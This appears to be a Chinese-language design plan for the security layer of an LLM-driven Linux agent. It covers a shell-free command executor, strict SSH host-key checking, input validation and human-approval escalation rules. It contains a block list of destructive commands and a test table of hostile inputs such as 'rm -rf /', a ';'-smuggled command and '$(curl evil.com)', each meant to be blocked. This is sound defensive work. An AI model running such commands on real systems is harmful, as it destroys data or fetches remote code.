# Plan 2 · 安全层

**目标**：实现零 shell 注入风险的命令执行器和安全的 SSH 管理器，替换原有所有危险路径。

**前置条件**：Plan 1 完成（接口定义就位）  
**交付物**：`src/linuxagent/executors/` + `src/linuxagent/cluster/`，通过全部安全测试

---

## Scope

### 2.1 安全命令执行器（`executors/linux_executor.py`）

**绝对禁止** `shell=True`。完整实现：

```
LinuxCommandExecutor
├── is_safe(cmd) -> SafetyResult      ← token 级安全检测
├── execute(cmd) -> ExecutionResult   ← 非交互式命令
├── execute_interactive(cmd)          ← 白名单交互式命令
└── _parse_command(cmd) -> list[str]  ← shlex.split 解析
```

**安全检测流程（`is_safe`）**：

1. `shlex.split(cmd)` 解析，解析失败 → 拒绝
2. 取 `tokens[0]`（命令名），对照黑名单精确匹配
3. 对参数列表逐个 token 匹配危险模式（正则，非字符串 `in`）
4. 检测路径遍历：`/etc/shadow`、`/proc/`、`/sys/` 等敏感路径
5. 返回 `SafetyResult(level, reason)`，三级：`SAFE` / `CONFIRM` / `BLOCK`

**交互式命令判断**：

```python
INTERACTIVE_COMMANDS: frozenset[str] = frozenset({
    "vim", "vi", "nano", "emacs", "htop", "top",
    "less", "more", "man", "ssh", "python", "python3",
    "bash", "zsh", "sh", "ipython",
})

def _is_interactive(self, tokens: list[str]) -> bool:
    return tokens[0] in INTERACTIVE_COMMANDS  # 精确匹配命令名，非字符串包含
```

**执行实现**：

```python
async def execute(self, command: str) -> ExecutionResult:
    tokens = self._parse_command(command)
    proc = await asyncio.create_subprocess_exec(
        *tokens,                          # 列表参数，不经 shell
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await asyncio.wait_for(
        proc.communicate(), timeout=self.config.timeout
    )
    return ExecutionResult(...)
```

### 2.2 执行结果数据类

```python
@dataclass(frozen=True)
class ExecutionResult:
    command: str
    exit_code: int
    stdout: str
    stderr: str
    duration: float

@dataclass(frozen=True)
class SafetyResult:
    level: SafetyLevel          # SAFE / CONFIRM / BLOCK
    reason: str | None = None
    matched_rule: str | None = None
```

### 2.3 SSH 集群管理器（`cluster/ssh_manager.py`）

**强制主机密钥验证**：

```python
client.set_missing_host_key_policy(paramiko.RejectPolicy())
client.load_system_host_keys()
# 仅在 config.ssh.warn_unknown_hosts=true 时使用 WarningPolicy
```

其余重构：
- 连接池（避免每次命令重连）
- 异步包装（`asyncio.get_event_loop().run_in_executor`）
- 超时统一从 `AppConfig.cluster.timeout` 读取

### 2.4 输入校验中间件

所有来自 LLM 的命令字符串在执行前经过：

1. 长度校验（上限 2048 字符）
2. 空字节检测
3. Unicode 双向控制字符检测（BiDi 攻击防御）
4. `is_safe()` 三级判断
5. **来源升级**（见 §2.5）

### 2.5 命令来源与 HITL 升级规则（R-HITL-01/03）

`SafetyResult` 新增 `command_source` 字段，取值 `llm` / `user` / `whitelist`。`is_safe()` 在**基础判断**之上，按来源对最终级别做升级（只升不降）：

| 来源 | 基础判 SAFE | 基础判 CONFIRM | 基础判 BLOCK |
|---|---|---|---|
| `user`（用户手打） | SAFE | CONFIRM | BLOCK |
| `llm`（LLM 生成，首次） | **升级为 CONFIRM** | CONFIRM | BLOCK |
| `whitelist`（会话白名单命中） | SAFE | CONFIRM | BLOCK |
| 任意来源 + 命中 `DESTRUCTIVE_PATTERNS` | **强制 CONFIRM**，不进白名单 | CONFIRM | BLOCK |

**会话白名单（`SessionWhitelist`）**：
- 键 = 归一化命令（`shlex.split(cmd)[0]` + 按 token 模式匹配的参数签名），不使用完整命令字符串，避免仅空白差异绕过
- 进程内 `dict[str, WhitelistEntry]`，无持久化
- 破坏性命令（R-HITL-03）永不写入；写入时若已存在相同键，更新时间戳但不改状态
- 进程退出（含 SIGTERM / SIGINT）时不持久化

**`DESTRUCTIVE_PATTERNS`（初稿，放 `executors/safety.py`）**：

```python
DESTRUCTIVE_COMMANDS: frozenset[str] = frozenset({
    "rm", "rmdir", "mkfs", "dd", "shred", "fdisk", "parted",
    "mv",  # 仅当目标为现有非空路径时由参数分析器细化判断
})

DESTRUCTIVE_ARG_PATTERNS: tuple[re.Pattern, ...] = (
    re.compile(r"^-[rfRF]+$"),       # rm -rf / -Rf
    re.compile(r"^--no-preserve-root$"),
)

DESTRUCTIVE_SUBCOMMAND_PATTERNS: tuple[tuple[str, re.Pattern], ...] = (
    ("systemctl", re.compile(r"^(stop|disable|mask|kill)$")),
    ("kubectl",   re.compile(r"^(delete|drain|cordon)$")),
    ("docker",    re.compile(r"^(rm|kill|system\s+prune)$")),
    ("git",       re.compile(r"^(push\s+--force|reset\s+--hard|clean\s+-f)$")),
)
```

修改 / 扩充本清单需在 `change/` 留痕（因其直接决定 HITL 覆盖面）。

---

## 测试要求

安全测试**不得 mock** `is_safe` 或 `execute` 的核心逻辑路径（参见 R-TEST-02）。

必须覆盖的测试用例：

| 测试 | 预期结果 |
|---|---|
| `rm -rf /` | BLOCK |
| `rm -rf /tmp/test` | CONFIRM |
| `ls -la` | SAFE |
| `echo "hello; rm -rf /"` | BLOCK（检测到 `;` 分隔符） |
| `$(curl evil.com)` | BLOCK |
| `\x00 injection` | BLOCK |
| BiDi 控制字符注入 | BLOCK |
| `echo "run python now"` | SAFE（不触发交互式判断） |
| `python script.py` | CONFIRM（命令名为 python） |
| SSH 到未知主机 | 抛出 `SSHUnknownHostError` |
| LLM 生成的 `ls -la` | **CONFIRM**（R-HITL-01 来源升级），批准后加入会话白名单 |
| 白名单命中的 `ls -la`（同会话第二次） | SAFE |
| 白名单命中的 `rm -rf /tmp/x`（即使之前批准过） | **CONFIRM**（R-HITL-03） |
| 3 台主机上执行 `uptime` | CONFIRM（R-HITL-02 批量阈值） |

---

## 验收标准

- [ ] 全部上表测试用例通过
- [ ] `subprocess` 调用全量 grep 确认无 `shell=True`
- [ ] `os.system` 调用全量 grep 确认为零
- [ ] SSH 测试：连接未知主机抛出异常（不静默接受）
- [ ] `mypy src/linuxagent/executors/ src/linuxagent/cluster/` 零错误

---

<!-- 完成记录（完成后追加） -->
